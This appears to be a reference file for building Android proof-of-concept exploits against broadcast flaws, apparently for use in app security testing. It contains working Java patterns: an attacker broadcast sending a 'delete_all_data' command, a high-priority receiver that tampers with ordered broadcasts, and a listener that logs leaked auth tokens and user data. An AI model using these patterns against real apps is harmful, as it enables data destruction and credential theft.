---
name: poc-app-broadcast
description: Broadcast PoC reference covering dynamic receiver abuse, ordered-broadcast hijack, permission bypass, and global broadcast leakage.
---

# Broadcast PoC Reference

Attacker-controlled or attacker-observable broadcast flows. Usually `direct-trigger` or `interception` shapes.

## Construction Matrix

| Vulnerability | PoC shape | Typical support | Visible success |
|---|---|---|---|
| dynamic receiver abuse | `direct-trigger` | none | receiver accepts attacker command |
| ordered hijack | `interception` | runtime receiver | result is modified or broadcast is aborted |
| permission bypass | `direct-trigger` | manifest permission | protected broadcast still sends or lands |
| global leak | `interception` | runtime receiver | sensitive extras are captured |

## Shared Inputs

Real broadcast action, required extras/categories/permission/ordered-result shape, whether the PoC proves direct send or interception, visible success signal.

## Pattern 1 - Direct Broadcast Send

For dynamic receiver abuse and permission bypass.

```java
private static void runBroadcastDynamicAbuse(Context context) {
    Intent intent = new Intent("com.target.INTERNAL_ACTION");
    intent.putExtra("command", "delete_all_data");
    intent.putExtra("confirm", true);
    context.sendBroadcast(intent);
    Log.i("PoC", "Sent attacker-controlled broadcast to com.target.INTERNAL_ACTION");
}
```

```java
static {
    register("broadcast-send", "Send Broadcast", () -> runBroadcastDynamicAbuse(appContext));
}
```

## Pattern 2 - Ordered-Broadcast Interception

For ordered-broadcast hijack or modification.

```java
private static void runOrderedBroadcastHijack(Context context) {
    IntentFilter filter = new IntentFilter("com.target.ORDERED_ACTION");
    filter.setPriority(999);

    BroadcastReceiver interceptor = new BroadcastReceiver() {
        @Override
        public void onReceive(Context ctx, Intent intent) {
            Log.i("PoC", "Intercepted ordered broadcast");
            setResultData("tampered_result");
        }
    };

    context.registerReceiver(interceptor, filter, Context.RECEIVER_EXPORTED);
    context.sendOrderedBroadcast(new Intent("com.target.ORDERED_ACTION"), null);
}
```

```java
static {
    register("broadcast-ordered", "Hijack Ordered Broadcast", () -> runOrderedBroadcastHijack(appContext));
}
```

## Pattern 3 - Broadcast Leak Listener

For global broadcast leaks.

```java
private static void runBroadcastLeakCapture(Context context) {
    IntentFilter filter = new IntentFilter("com.target.SENSITIVE_DATA_ACTION");
    BroadcastReceiver listener = new BroadcastReceiver() {
        @Override
        public void onReceive(Context ctx, Intent intent) {
            Log.i("PoC", "Leaked token: " + intent.getStringExtra("auth_token"));
            Log.i("PoC", "Leaked user data: " + intent.getStringExtra("user_data"));
        }
    };

    context.registerReceiver(listener, filter, Context.RECEIVER_EXPORTED);
    Log.i("PoC", "Registered broadcast listener and waiting for target broadcast");
}
```

```java
static {
    register("broadcast-listen", "Listen For Broadcast Leak", () -> runBroadcastLeakCapture(appContext));
}
```

Declare the target custom permission only for permission-bypass cases where `protectionLevel` is attacker-obtainable. Do not add unnecessary Manifest receivers if a runtime receiver suffices.
